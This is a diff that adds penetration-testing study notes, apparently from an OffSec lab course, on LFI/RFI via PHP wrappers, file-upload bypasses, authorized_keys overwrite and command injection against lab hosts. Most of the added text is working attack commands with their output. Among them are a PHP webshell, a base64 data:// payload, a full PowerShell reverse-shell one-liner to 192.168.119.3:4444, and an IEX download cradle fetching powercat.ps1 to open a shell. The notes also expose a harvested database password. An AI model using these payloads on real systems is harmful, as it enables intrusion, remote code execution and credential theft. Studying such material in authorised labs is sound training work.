@@ -118,8 +118,7 @@ kali@kali:~$ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
 ...
 offsec@68b68f3eb343:~$ 
 ```
-On Linux, we usually use the /etc/passwd file to test directory
-traversal vulnerabilities. On Windows, we can use the file **C:\Windows\System32\drivers\etc\hosts** to test directory traversal vulnerabilities, which is readable by all local users. By displaying this file, we can confirm the vulnerability exists and understand how the web application displays the contents of files.
+On Linux, we usually use the /etc/passwd file to test directory traversal vulnerabilities. On Windows, we can use the file **C:\Windows\System32\drivers\etc\hosts** to test directory traversal vulnerabilities, which is readable by all local users. By displaying this file, we can confirm the vulnerability exists and understand how the web application displays the contents of files.
 
 After confirming the vulnerability, we can try to specify files containing sensitive information such as configuration files and logs.
 
@@ -262,4 +261,392 @@ When we use Log Poisoning on Windows, we should understand that the log files ar
 
 Exploiting File Inclusion vulnerabilities depends heavily on the web application's programming language, the version, and the web server configuration. 
 
-Outside PHP, we can also leverage LFI and RFI vulnerabilities in other frameworks or server-side scripting languages including Perl, Active Server Pages Extended, Active Server Pages, and Java Server Pages.
+Also PHP is the most common, we can also leverage LFI and RFI vulnerabilities in other frameworks or server-side scripting languages including Perl, Active Server Pages Extended, Active Server Pages, and Java Server Pages. Watch out for Node.js for LFI.
+
+PHP offers a variety of protocol wrappers to enhance the language's capabilities. For example, PHP wrappers can be used to represent and access local or remote filesystems. We can use these wrappers to bypass filters or obtain code execution via File Inclusion vulnerabilities in PHP web applications.
+
+We can use the **php://filter** wrapper to **display the contents of files**either with or without encodings like ROT13 or Base64.
+
+```bash
+kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=admin.php
+...
+<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Maintenance</title>
+</head>
+<body>
+        <span style="color:#F00;text-align:center;">The admin page is currently under maintenance.
+```
+
+We notice that the <body> tag is not closed at the end of the HTML code. We can assume that something is missing. PHP code will be executed server side and, as such, is not shown.
+
+Using php://filter to better understand this situation. We will not use any encoding on our first attempt. The PHP wrapper uses resource as the required parameter to specify the file stream for filtering, which is the filename in our case. We can also specify absolute or relative paths in this parameter.
+```bash
+kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
+...
+<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Maintenance</title>
+</head>
+<body>
+        <span style="color:#F00;text-align:center;">The admin page is currently under maintenance.
+```
+The output shows the same text, since the PHP code is included and executed via the LFI vulnerability. Let's now encode the output with base64 by adding *convert.base64-encode*. This converts the specified resource to a base64 string.
+```bash
+kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
+...
+<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
+PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbn...
+dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K
+...
+```
+We included base64 encoded data, while the rest of the page loaded correctly. We can now use the base64 program with the -d flag to decode the encoded data in the terminal.
+```bash
+kali@kali:~$ echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOwokdXNlcm5hbWUgPSAicm9vdCI7CiRwYXNzd29yZCA9ICJNMDBuSzRrZUNhcmQhMiMiOwoKLy8gQ3JlYXRlIGNvbm5lY3Rpb24KJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CgovLyBDaGVjayBjb25uZWN0aW9uCmlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K" | base64 -d
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Maintenance</title>
+</head>
+<body>
+        <?php echo '<span style="color:#F00;text-align:center;">The admin page is currently under maintenance.'; ?>
+
+<?php
+$servername = "localhost";
+$username = "root";
+$password = "M00nK4keCard!2#";
+
+// Create connection
+$conn = new mysqli($servername, $username, $password);
+...
+```
+
+The decoded data contains MySQL[411] connection information, including a username and password. We can use these credentials to connect to the database or try the password for user accounts via SSH.
+
+While the php://filter wrapper can be used to include the contents of a file, we can use the **data:// wrapper** to **achieve code execution**. This wrapper is used to **embed data elements as plaintext or base64-encoded data in the running web application's code**. This offers an alternative method when we cannot poison a local file with PHP code.
+
+We will try to embed a small URL-encoded PHP snippet into the web application's code. We can use the same PHP snippet as previously with ls the command
+```bash
+kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
+...
+<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
+admin.php
+bavarian.php
+css
+fonts
+img
+index.php
+js
+...
+```
+It worked.
+
+When web application firewalls or other security mechanisms are in place, they may filter strings like "system" or other PHP code elements. In such a scenario, we can try to use the data:// wrapper with base64-encoded data. We'll first encode the PHP snippet into base64, then use curl to embed and execute it via the data:// wrapper. The -n is used to not output the trailing newline.
+```bash
+kali@kali:~$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64
+PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
+
+
+kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
+...
+<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
+admin.php
+bavarian.php
+css
+fonts
+img
+index.php
+js
+start.sh
+...
+```
+This is a handy technique that may help us bypass basic filters. However, we need to be aware that **the data:// wrapper will not work in a default PHP installation**. To exploit it, the *allow_url_include* setting needs to be enabled.
+
+Remote file inclusion (RFI) vulnerabilities are less common than LFIs since the target system must be configured in a specific way. 
+
+ While LFI vulnerabilities can be used to include local files, RFI vulnerabilities allow us to include files from a remote system over HTTP or SMB. The included file is also executed in the context of the web application.
+
+Common scenarios where we'll find this option enabled is when the web application loads files or contents from remote systems e.g. libraries or application data. 
+
+Kali Linux includes several PHP webshells in the /usr/share/webshells/php/ directory that can be used for RFI. We'll use simple-backdoor.php to test the LFI vulnerability from the previous sections for RFI.
+```bash
+kali@kali:/usr/share/webshells/php/$ cat simple-backdoor.php
+...
+<?php
+if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+}
+?>
+
+Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
+...
+```
+To leverage an RFI vulnerability, we need to make the remote file accessible by the target system. We can use the Python3 http.server module to start a web server on our Kali machine and serve the file we want to include remotely on the target system. The http.server module sets the web root to the current directory of our terminal.
+```bash
+kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+After the web server is running with /usr/share/webshells/php/ as its current directory, we have completed all necessary steps on our attacking machine. Next, we'll use curl to include the hosted file via HTTP and specify ls as our command.
+```bash
+kali@kali:/usr/share/webshells/php/$ curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
+...
+<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
+<!-- Simple PHP backdoor by DK (http://michaeldaw.org) --> 
+
+<pre>admin.php
+bavarian.php
+css
+fonts
+img
+index.php
+js
+</pre>                        
+```
+
+### File Upload Vulnerabilities
+
+The first category consists of vulnerabilities enabling us to upload files that are executable by the web application. For example, if we can upload a PHP script to a web server where PHP is enabled, we can execute the script by accessing it via the browser or curl.
+
+The second category consists of vulnerabilities that require us to combine the file upload mechanism with another vulnerability, such as Directory Traversal. For example, if the web application is vulnerable to Directory Traversal, we can use a relative path in the file upload request and try to overwrite files like *authorized_keys*. Furthermore, we can also combine file upload mechanisms with XML External Entity (XXE) or Cross Site Scripting (XSS) attacks. For example, when we are allowed to upload an avatar to a profile with an SVG file type, we may embed an XXE attack to display file contents or even execute code.
+
+The third category relies on user interaction. For example, when we discover an upload form for job applications, we can try to upload a CV in .docx format with malicious macros
+integrated. This category requires a person to access our uploaded file.
+
+If the web application is a Content Management System (CMS), we can often upload an avatar for our profile or create blog posts and web pages with attached files. 
+
+If our target is a company website, we can often find upload mechanisms in career sections or company-specific use cases.
+
+Sometimes the file upload mechanisms are not obvious to users, so we should never skip the enumeration phase when working with a web application.
+
+When there is a file upload option, test what kinds of files are allowed for upload. Starting with PHP file is a good option. If PHP uploads are blocked, you can try using less-commonly used PHP file extensions such as **.phps** and **.php7**. This may allow up to bypass simple filters that check for the most common file extensions, .php and .phtml. These file extensions orginate from older PHP versions, but are still supported for compatibility. **Another way to bypass simple filters is to try to capitalize the file extensions, such as .pHP.**
+```bash
+kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
+...
+ Directory of C:\xampp\htdocs\meteor\uploads
+
+04/04/2022  06:23 AM    <DIR>          .
+04/04/2022  06:23 AM    <DIR>          ..
+04/04/2022  06:21 AM               328 simple-backdoor.pHP
+04/04/2022  06:03 AM                15 test.txt
+               2 File(s)            343 bytes
+               2 Dir(s)  15,410,925,568 bytes free
+...
+```
+
+Wrap up this section by obtaining a reverse shell from the target machine. We'll start a Netcat listener in a new terminal to catch the incoming reverse shell on port 4444.
+```bash
+kali@kali:~$ nc -nvlp 4444
+listening on [any] 4444 ...
+
+```
+
+Let's use a PowerShell one-liner for our reverse
+shell. Since there are several special characters in the reverse shell one-liner, we will encode the string with base64. We can use PowerShell or an online converter to perform the encoding.
+
+First, let's create the variable $Text, which will be used for storing the reverse shell one-liner as a string. Then, we can use the method convert and the property Unicode from the class Encoding to encode the contents of the $Text variable.
+```bash
+kali@kali:~$ pwsh
+PowerShell 7.1.3
+Copyright (c) Microsoft Corporation.
+
+https://aka.ms/powershell
+Type 'help' to get help.
+
+PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+
+PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+
+PS> $EncodedText =[Convert]::ToBase64String($Bytes)
+
+PS> $EncodedText
+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
+...
+AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+
+
+PS> exit
+
+```
+
+Let's use curl to execute the encoded one-liner via the uploaded simple-backdoor.pHP. We can add the base64 encoded string for the powershell command using the -enc parameter. We'll also need to use URL encoding for the spaces.
+```bash
+kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
+...
+AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+
+```
+
+After executing the command, we should receive an incoming reverse shell in the second terminal where Netcat is listening.
+```bash
+kali@kali:~$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.119.3] from (UNKNOWN) [192.168.50.189] 50603
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 192.168.50.189
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.50.254
+
+PS C:\xampp\htdocs\meteor\uploads> whoami
+nt authority\system
+```
+Now we have the shell.
+
+If the target web application was using ASP instead of PHP, we could have used the same process to obtain code execution as we did in the previous example, instead uploading an ASP web shell. Kali already contains a broad variety of web shells covering the frameworks and languages we discussed previously located in the /usr/share/webshells/ directory.
+
+**While the implementation of a web shell is dependent on the programming language, the basic process of using a web shell is nearly identical across these frameworks and languages. After we identify the framework or language of the target web application, we need to find a way to upload our web shell. The web shell needs to be placed in a location where we can access it. Next, we can provide commands to it, which are executed on the underlying system.**
+
+**We should be aware that the file types of our web shells may be blacklisted via a filter or upload mechanism. In situations like this, we can try to bypass the filter as in this section. However, there are other options to consider. Web applications handling and managing files often enable users to rename or modify files. We could abuse this by uploading a file with an innocent file type like .txt, then changing the file back to the original file type of the web shell by renaming it.**
+
+For a web app like Google Drive, where we can upload any file, but cannot leverage it to get system access. In situations such as this, we need to leverage another vulnerability such as Directory Traversal to abuse the file upload mechanism.
+
+When testing a file upload form, we should always determine
+what happens when a file is uploaded twice.
+- If the web application indicates that the file already exists, we can use this method to brute force the contents of a web server.
+- Alternatively, if the web application displays an error message, this may provide valuable information such as the programming language or web technologies in use.
+
+Check if the web application allows us to specify a relative path in the filename and write a file via Directory Traversal outside of the web root. We can do this by modifying the "filename" parameter in the request so it contains ../../../../../../../test.txt, then click send.
+
+Unfortunately, we have no way of knowing if the relative path was used for placing the file. It's possible that the web application's response merely echoed our filename and sanitized it internally. For now, let's assume the relative path was used for placing the file, since we cannot find any other attack vector. If our assumption is correct, we can try to blindly overwrite files, which may lead us to system access. 
+
+#### Web Server Accounts and Permissions
+
+Web applications using Apache, Nginx or other dedicated web servers often run with specific users, such as www-data on Linux.
+
+Traditionally on Windows, the IIS web server runs as a Network Service account, a passwordless built-in Windows identity with low privileges. Starting with IIS version 7.5, Microsoft introduced the IIS Application Pool Identities. These are virtual accounts running web applications grouped by application pools. Each application pool has its own pool identity, making it possible to set more precise permissions for accounts running web applications.
+
+When using programming languages that include their own web server, administrators and developers often deploy the web application without any privilege structures by running applications as root or Administrator to avoid any permissions issues.
+- This means we should always verify whether we can leverage root or administrator privileges in a file upload vulnerability.
+
+Let's try to overwrite the authorized_keys file in the home directory for root. If this file contains the public key of a private key we control, we can access the system via SSH as the root user.
+```bash
+kali@kali:~$ ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in fileup
+Your public key has been saved in fileup.pub
+...
+
+kali@kali:~$ cat fileup.pub > authorized_keys
+```
+We can upload it using the relative path ../../../../../../../root/.ssh/authorized_keys. If we've successfully overwritten the authorized_keys file of the root user, we should be able to use our private key to connect to the system via SSH. We should note that often the root user does not carry SSH access permissions. However, since we can't check for other users by, for example, displaying the contents of /etc/passwd, this is our only option.
+
+In the Directory Traversal Learning Unit, we connected to port 2222 on the host mountaindesserts.com and our Kali system saved the host key of the remote host. Since the target system of this section is a different machine, SSH will throw an error because it cannot verify the host key it saved previously. To avoid this error, we'll delete the known_hosts file before we connect to the system. This file contains all host keys of previous SSH connections.
+```bash
+kali@kali:~$ rm ~/.ssh/known_hosts
+
+kali@kali:~$ ssh -p 2222 -i fileup root@mountaindesserts.com
+The authenticity of host '[mountaindesserts.com]:2222 ([192.168.50.16]:2222)' can't be established.
+ED25519 key fingerprint is SHA256:R2JQNI3WJqpEehY2Iv9QdlMAoeB3jnPvjJqqfDZ3IXU.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+...
+root@76b77a6eae51:~#
+```
+We could successfully connect as root with our private key due to the overwritten authorized_keys file.
+
+### Command Injection
+
+Since most injections are filtered out, you must find the root of the filter, and try to bypass it.
+
+If you know that one command is allowed, try executing that command AND another one of your choice (& for Windows and && for UNIX), or separate the commands with a semi-colon ('%3B').
+```bash
+kali@kali:~$ curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
+
+...
+'git help -a' and 'git help -g' list available subcommands and some
+concept guides. See 'git help <command>' or 'git help <concept>'
+to read about a specific subcommand or concept.
+See 'git help git' for an overview of the system.
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 192.168.50.189
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.50.254
+```
+**To find out if PowerShell or CMD is executing your commands**
+```bash
+(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+```
+You can use URL encoding to send it.
+```bash
+kali@kali:~$ curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
+
+...
+See 'git help git' for an overview of the system.
+PowerShell
+```
+You can try to leverage command injection to achieve system access. We will use Powercat to create a reverse shell. Powercat is a PowerShell implementation of Netcat included in Kali. Start a new terminal, copy Powercat to the home directory for the kali user, and start a Python3 web server in the same directory.
+```bash
+kali@kali:~$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+
+kali@kali:~$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+Start a third terminal tab to create a Netcat listener on port 4444 to catch the reverse shell.
+```bash
+kali@kali:~$ nc -nvlp 4444
+listening on [any] 4444 ...
+
+```
+With our web server serving powercat.ps1 and Netcat listener in place, we can now use curl in the first terminal to inject the following command. It consists of two parts delimited by a semicolon. The first part uses a PowerShell download cradle to load the Powercat function contained in the powercat.ps1 script from our web server. The second command uses the powercat function to create the reverse shell with the following parameters: -c to specify where to connect, -p for the port, and -e for executing a program.
+```bash
+IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
+```
+
+Again, we'll use URL encoding for the command and send it.
+```bash
+kali@kali:~$ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
+```
+
+After entering the command, the second terminal should show that we received a GET request for the powercat.ps1 file.
+```bash
+kali@kali:~$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.50.189 - - [05/Apr/2022 09:05:48] "GET /powercat.ps1 HTTP/1.1" 200 -
+
+```
+
+We'll also find an incoming reverse shell connection in the third terminal for our active Netcat listener.
+
+```bash
+kali@kali:~$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.119.3] from (UNKNOWN) [192.168.50.189] 50325
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\Administrator\Documents\meteor>
+```
+
+Instead of using Powercat, we could also inject a PowerShell reverse shell directly. There are many ways to exploit a command injection vulnerability that depend heavily on the underlying operating system and the implementation of the web application, as well as any security mechanisms in place.
+
+While the vulnerabilities are not dependent on specific programming languages or web frameworks, their exploitation may be. Therefore, **we should always take the time to briefly understand the web technologies being used before we attempt to exploit them. **
